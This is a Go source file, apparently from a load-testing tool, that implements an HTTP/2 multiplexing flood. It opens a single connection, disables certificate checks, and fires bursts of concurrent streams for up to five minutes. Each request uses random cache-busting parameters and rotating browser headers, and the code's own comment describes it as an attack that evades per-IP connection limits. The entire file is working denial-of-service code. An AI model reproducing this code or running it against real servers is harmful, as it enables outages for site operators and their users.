package strategy

import (
	"context"
	"crypto/tls"
	"fmt"
	"io"
	"math/rand"
	"net"
	"net/http"
	"net/url"
	"sync/atomic"
	"time"

	"github.com/jdw/loadtestforge/internal/httpdata"
	"github.com/jdw/loadtestforge/internal/netutil"

	"golang.org/x/net/http2"
)

// H2Flood implements HTTP/2 multiplexing flood attack.
// It opens a single TCP connection and spawns thousands of concurrent streams,
// effectively bypassing per-IP connection limits while maximizing server load.
type H2Flood struct {
	maxConcurrentStreams int
	streamBurstSize      int
	connectionTimeout    time.Duration
	maxSessionLife       time.Duration
	activeConnections    int64
	activeStreams        int64
	requestsSent         int64
	streamFailures       int64
	bindConfig           *netutil.BindConfig
	metricsCallback      MetricsCallback
}

func NewH2Flood(maxStreams int, burstSize int, bindIP string) *H2Flood {
	if maxStreams <= 0 {
		maxStreams = 100
	}
	if burstSize <= 0 {
		burstSize = 10
	}

	return &H2Flood{
		maxConcurrentStreams: maxStreams,
		streamBurstSize:      burstSize,
		connectionTimeout:    10 * time.Second,
		maxSessionLife:       5 * time.Minute,
		bindConfig:           netutil.NewBindConfig(bindIP),
	}
}

func (h *H2Flood) Execute(ctx context.Context, target Target) error {
	parsedURL, host, useTLS, err := netutil.ParseTargetURL(target.URL)
	if err != nil {
		return err
	}

	if !useTLS {
		// HTTP/2 requires TLS in practice (h2c is rare)
		// Fall back to h2c or return error
		return h.executeH2C(ctx, target, parsedURL, host)
	}

	sessionCtx, cancel := context.WithTimeout(ctx, h.maxSessionLife)
	defer cancel()

	// Establish TLS connection with ALPN for HTTP/2
	tlsConfig := &tls.Config{
		ServerName:         parsedURL.Hostname(),
		NextProtos:         []string{"h2", "http/1.1"},
		InsecureSkipVerify: true,
	}

	dialer := &net.Dialer{
		Timeout:   h.connectionTimeout,
		LocalAddr: h.bindConfig.GetLocalAddr(),
	}

	netConn, err := dialer.DialContext(sessionCtx, "tcp", host)
	if err != nil {
		return fmt.Errorf("tcp connection failed: %w", err)
	}

	tlsConn := tls.Client(netConn, tlsConfig)
	if err := tlsConn.HandshakeContext(sessionCtx); err != nil {
		netConn.Close()
		return fmt.Errorf("tls handshake failed: %w", err)
	}

	// Verify HTTP/2 was negotiated
	if tlsConn.ConnectionState().NegotiatedProtocol != "h2" {
		tlsConn.Close()
		return fmt.Errorf("http/2 not negotiated, got: %s", tlsConn.ConnectionState().NegotiatedProtocol)
	}

	atomic.AddInt64(&h.activeConnections, 1)
	defer func() {
		tlsConn.Close()
		atomic.AddInt64(&h.activeConnections, -1)
	}()

	// Create HTTP/2 transport and client connection
	transport := &http2.Transport{
		TLSClientConfig: tlsConfig,
		AllowHTTP:       false,
	}

	clientConn, err := transport.NewClientConn(tlsConn)
	if err != nil {
		return fmt.Errorf("h2 client connection failed: %w", err)
	}

	path := parsedURL.Path
	if path == "" {
		path = "/"
	}

	// Stream flood loop
	streamSem := make(chan struct{}, h.maxConcurrentStreams)

	for {
		select {
		case <-sessionCtx.Done():
			return nil
		default:
		}

		// Burst multiple streams
		for i := 0; i < h.streamBurstSize; i++ {
			select {
			case streamSem <- struct{}{}:
				atomic.AddInt64(&h.activeStreams, 1)

				go func() {
					defer func() {
						<-streamSem
						atomic.AddInt64(&h.activeStreams, -1)
					}()

					h.sendStream(sessionCtx, clientConn, target.URL, path, parsedURL.Host)
				}()
			default:
				// Semaphore full, wait a bit
				time.Sleep(100 * time.Microsecond)
			}
		}

		// Small delay between bursts
		time.Sleep(1 * time.Millisecond)
	}
}

func (h *H2Flood) sendStream(ctx context.Context, cc *http2.ClientConn, targetURL, path, host string) {
	reqCtx, cancel := context.WithTimeout(ctx, 5*time.Second)
	defer cancel()

	// Create request with random parameters to bypass caching
	url := fmt.Sprintf("%s?r=%d&t=%d", targetURL, rand.Intn(100000000), time.Now().UnixNano())

	req, err := http.NewRequestWithContext(reqCtx, "GET", url, nil)
	if err != nil {
		atomic.AddInt64(&h.streamFailures, 1)
		return
	}

	req.Header.Set("User-Agent", httpdata.RandomUserAgent())
	req.Header.Set("Accept", httpdata.RandomAccept())
	req.Header.Set("Accept-Language", httpdata.RandomAcceptLanguage())
	req.Header.Set("Accept-Encoding", httpdata.RandomAcceptEncoding())
	req.Header.Set("Cache-Control", httpdata.RandomCacheControl())

	startTime := time.Now()
	resp, err := cc.RoundTrip(req)
	latency := time.Since(startTime)

	if err != nil {
		atomic.AddInt64(&h.streamFailures, 1)
		return
	}

	// Discard response body quickly to free stream
	io.Copy(io.Discard, resp.Body)
	resp.Body.Close()

	atomic.AddInt64(&h.requestsSent, 1)

	if resp.StatusCode >= 400 {
		atomic.AddInt64(&h.streamFailures, 1)
		return
	}

	if h.metricsCallback != nil {
		h.metricsCallback.RecordSuccessWithLatency(latency)
	}
}

// executeH2C handles HTTP/2 over cleartext (h2c) - rare but possible
func (h *H2Flood) executeH2C(ctx context.Context, target Target, parsedURL *url.URL, host string) error {
	sessionCtx, cancel := context.WithTimeout(ctx, h.maxSessionLife)
	defer cancel()

	dialer := &net.Dialer{
		Timeout:   h.connectionTimeout,
		LocalAddr: h.bindConfig.GetLocalAddr(),
	}

	conn, err := dialer.DialContext(sessionCtx, "tcp", host)
	if err != nil {
		return fmt.Errorf("tcp connection failed: %w", err)
	}

	atomic.AddInt64(&h.activeConnections, 1)
	defer func() {
		conn.Close()
		atomic.AddInt64(&h.activeConnections, -1)
	}()

	// h2c upgrade transport
	transport := &http2.Transport{
		AllowHTTP: true,
		DialTLSContext: func(ctx context.Context, network, addr string, cfg *tls.Config) (net.Conn, error) {
			return conn, nil
		},
	}

	clientConn, err := transport.NewClientConn(conn)
	if err != nil {
		return fmt.Errorf("h2c client connection failed: %w", err)
	}

	path := parsedURL.Path
	if path == "" {
		path = "/"
	}

	streamSem := make(chan struct{}, h.maxConcurrentStreams)

	for {
		select {
		case <-sessionCtx.Done():
			return nil
		default:
		}

		for i := 0; i < h.streamBurstSize; i++ {
			select {
			case streamSem <- struct{}{}:
				atomic.AddInt64(&h.activeStreams, 1)

				go func() {
					defer func() {
						<-streamSem
						atomic.AddInt64(&h.activeStreams, -1)
					}()

					h.sendStream(sessionCtx, clientConn, target.URL, path, parsedURL.Host)
				}()
			default:
				time.Sleep(100 * time.Microsecond)
			}
		}

		time.Sleep(1 * time.Millisecond)
	}
}

func (h *H2Flood) Name() string {
	return "h2-flood"
}

func (h *H2Flood) ActiveConnections() int64 {
	return atomic.LoadInt64(&h.activeConnections)
}

func (h *H2Flood) ActiveStreams() int64 {
	return atomic.LoadInt64(&h.activeStreams)
}

func (h *H2Flood) RequestsSent() int64 {
	return atomic.LoadInt64(&h.requestsSent)
}

func (h *H2Flood) StreamFailures() int64 {
	return atomic.LoadInt64(&h.streamFailures)
}

func (h *H2Flood) SetMetricsCallback(callback MetricsCallback) {
	h.metricsCallback = callback
}
